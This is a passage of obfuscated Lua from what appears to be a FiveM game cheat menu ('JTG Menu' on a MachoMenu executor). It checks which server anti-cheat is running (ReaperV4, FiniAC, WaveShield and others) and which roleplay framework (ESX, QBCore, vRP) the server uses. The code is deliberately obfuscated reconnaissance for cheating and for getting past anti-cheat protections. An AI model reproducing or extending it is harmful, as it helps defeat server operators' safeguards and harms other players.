3 )=="reaperv") then v242="ReaperV4";elseif (v241:sub(1,1437 -(797 + 636) )=="fini") then v242="FiniAC";elseif (v241:sub(4 -3 ,1626 -(1427 + 192) )=="chubsac") then v242="ChubsAC";elseif (v241:sub(1 + 0 ,13 -7 )=="fireac") then v242="FireAC";elseif (v241:sub(1 + 0 ,4 + 3 )=="drillac") then v242="DrillAC";elseif (v241:sub( -(333 -(192 + 134)))=="eshield") then v242="WaveShield";elseif (v241:sub( -(1286 -(316 + 960)))=="likizao_ac") then v242="Likizao-AC";elseif (v241:sub(1,3 + 2 )=="greek") then v242="GreekAC";elseif (v241=="pac") then v242="PhoenixAC";elseif (v241=="electronac") then v242="ElectronAC";end if v242 then local v295=0 + 0 ;while true do if ((1 + 0)==v295) then return v240,v242;end if (v295==0) then v218("Anti-Cheat: %s",v242);AntiCheat=v242;v295=3 -2 ;end end end end v218("No Anti-Cheat found");return nil,nil;end);MachoMenuButton(v40[554 -(83 + 468) ],"Framework Checker",function() local v222=0;local v223;local v224;local v225;local v226;local v227;while true do if (v222==(1809 -(1202 + 604))) then function v226() for v331,v332 in ipairs(v225) do for v343,v344 in ipairs(v332.globals) do if (_G[v344]~=nil) then return v332.label;end end end for v333,v334 in ipairs(v225) do for v345,v346 in ipairs(v334.resources) do if v224(v346) then return v334.label;end end end return "Standalone";end v227=v226();v222=4;end if (v222==0) then v223=nil;function v223(v318,...) MachoMenuNotification("[NOTIFICATION] JTG Menu",string.format(v318,...));end v222=4 -3 ;end if ((1 -0)==v222) then v224=nil;function v224(v319) return GetResourceState(v319)=="started" ;end v222=5 -3 ;end if (v222==(329 -(45 + 280))) then v223("Framework: %s",v227);break;end if (v222==2) then v225={{label="ESX",globals={"ESX"},resources={"es_extended","esx-legacy"}},{label="QBCore",globals={"QBCore"},resources={"qb-core"}},{label="Qbox",globals={},resources={"qbox"}},{label="QBX Core",globals={},resources={"qbx-core"}},{label="ox_core",globals={"Ox"},resources={"ox_core"}},{label="ND_Core",globals={"NDCore"},resources={"nd-core","ND_Core"}},{label="vRP",globals={"vRP"},resources={"vrp"}}};v226=nil;v222=3;end end end);